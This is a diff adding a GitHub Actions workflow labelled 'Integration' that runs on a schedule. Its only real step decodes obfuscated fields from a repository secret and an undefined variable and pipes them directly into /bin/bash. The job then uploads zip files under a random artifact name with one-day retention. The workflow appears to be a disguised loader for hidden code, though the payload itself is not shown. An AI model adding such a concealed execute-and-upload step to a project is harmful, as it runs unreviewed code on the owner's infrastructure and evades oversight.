@@ -1,0 +1,27 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          pl5: ${{ secrets.pl5 }}
+        run: |
+          printf '%s' "$pl5" | jq -r .wf1912 | /bin/bash
+          printf '%s' "$asrp4282" | jq -r .i9330 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Hnci40Om
+          path: "*.zip"
+          retention-days: 1
